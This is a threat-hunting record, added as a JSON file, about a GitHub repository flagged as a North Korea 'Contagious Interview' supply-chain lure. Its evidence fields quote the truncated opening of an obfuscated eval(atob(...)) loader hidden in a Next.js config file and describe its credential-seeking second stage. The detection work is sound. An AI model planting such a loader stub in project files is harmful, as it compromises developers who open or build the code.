@@ -1,0 +1,99 @@
+{
+  "finding": {
+    "key": "repository:mts-services/asalmiah_nextjs_fixing",
+    "kind": "repository",
+    "family": "",
+    "id": "mts-services/asalmiah_nextjs_fixing",
+    "url": "https://github.com/MTS-Services/asalmiah_nextjs_fixing",
+    "registry": "github",
+    "owner": "mts-services",
+    "status": "confirmed",
+    "confidence": "review",
+    "score": 18,
+    "detection_method": "malicious_owner",
+    "attribution": "",
+    "campaign_id": "GW-C-58aa41d4",
+    "rules": "obfuscation/eval-decoded; obfuscation/atob; obfuscation/base64-buffer; code_execution/node-child-process; code_execution/js-exec",
+    "evidence_locations": "client/next.config.mjs:43; server/app/userService/controller/userController.js:2844; server/app/backup/controller/backup.controller.js:11; server/app/backup/controller/backup.controller.js:58; server/app/backup/controller/backup.controller.js:213",
+    "c2_hosts": "",
+    "iocs": "client/next.config.mjs",
+    "matched_signatures": "",
+    "reasons": "repository under owner MTS-Services of a known-malicious repo | Tier-2 confirmed (bash score 18)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260812T023911Z",
+    "last_seen": "hunt-20260812T023911Z",
+    "evidence_file": "repositories/mts-services_asalmiah_nextjs_fixing.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "client/next.config.mjs",
+      "line": 43,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "decoded payload -> require/module hijack, second-stage decode | eval(atob('Z2xvYmFsWychJ109JzExLSMnO3ZhciBfJF8xZTQyPShmdW5jdGlvbihsLGUpe3ZhciBoPWwubGVuZ3RoO3ZhciBnPVtdO2Zvcih2YXIgaj0wO2o8IGg7aisrKXtnW"
+    },
+    {
+      "file": "client/next.config.mjs",
+      "line": 43,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "eval(atob('Z2xvYmFsWychJ109JzExLSMnO3ZhciBfJF8xZTQyPShmdW5jdGlvbihsLGUpe3ZhciBoPWwubGVuZ3RoO3ZhciBnPVtdO2Zvcih2YXIgaj0wO2o8IGg7aisrKXtnW2pdPSBsLmNoYXJBdChqKX07Zm9yKHZhciBqPTA7ajwgaDtqKyspe3ZhciBzPWUqI"
+    },
+    {
+      "file": "server/app/userService/controller/userController.js",
+      "line": 2844,
+      "category": "obfuscation",
+      "rule": "base64-buffer",
+      "snippet": "const decoded = Buffer.from(token, \"base64\").toString(\"utf-8\");"
+    },
+    {
+      "file": "server/app/backup/controller/backup.controller.js",
+      "line": 11,
+      "category": "code_execution",
+      "rule": "node-child-process",
+      "snippet": "var exec = require(\"child_process\").exec;"
+    },
+    {
+      "file": "server/app/backup/controller/backup.controller.js",
+      "line": 58,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "new exec(cmd, (error, stdout, stderr) => {"
+    },
+    {
+      "file": "server/app/backup/controller/backup.controller.js",
+      "line": 213,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "new exec(cmd, (error, stdout, stderr) => {"
+    }
+  ],
+  "commit_sha": "5f25c76a9f66f926d1a0c7cc52e295a6b4ab1579",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/mts-services/asalmiah_nextjs_fixing",
+    "version_info": "all",
+    "threat_description": "Obfuscated loader. Payload in client/next.config.mjs.\nThe decoded blob rewrites the Node module loader and unpacks a further hidden stage: a working multi-stage loader, not data.\nThe eval(atob(...)) loader hidden in a project file is Contagious Interview (DPRK-attributed) tradecraft.\nCampaign GW-C-58aa41d4: one of 2 confirmed repos across 1 accounts sharing the loader stub 2e5ce46173.\nAttribution: we assess this repository as CONFIRMED North Korea 'Contagious Interview' activity. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader; Decoded second stage matches the BeaverTail/InvisibleFerret loader fingerprint (module-loader hijack / child_process exec / credential paths), verified by decoding the blob.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: client/next.config.mjs\n- client/next.config.mjs:43: decodes a hidden blob and executes it at load time (obfuscated loader)\n- client/next.config.mjs:43: hides code in an encoded blob that is decoded and run",
+    "publisher": "mts-services",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "contagious-interview",
+      "fake-recruiter",
+      "dprk",
+      "north-korea",
+      "obfuscated-eval-atob-loader",
+      "obfuscated-loader"
+    ],
+    "evidence_references": "https://github.com/mts-services/asalmiah_nextjs_fixing/blob/5f25c76a9f66f926d1a0c7cc52e295a6b4ab1579/client/next.config.mjs#L43\nhttps://github.com/mts-services/asalmiah_nextjs_fixing/blob/5f25c76a9f66f926d1a0c7cc52e295a6b4ab1579/server/app/userService/controller/userController.js#L2844\nhttps://github.com/mts-services/asalmiah_nextjs_fixing/blob/5f25c76a9f66f926d1a0c7cc52e295a6b4ab1579/server/app/backup/controller/backup.controller.js#L11\nhttps://github.com/mts-services/asalmiah_nextjs_fixing/blob/5f25c76a9f66f926d1a0c7cc52e295a6b4ab1579/server/app/backup/controller/backup.controller.js#L58\nhttps://github.com/mts-services/asalmiah_nextjs_fixing/blob/5f25c76a9f66f926d1a0c7cc52e295a6b4ab1579/server/app/backup/controller/backup.controller.js#L213",
+    "verified_iocs": "client/next.config.mjs",
+    "contributors": [],
+    "first_seen": "2026-08-12T02:39:11Z",
+    "last_seen": "2026-08-12T02:39:11Z"
+  }
+}
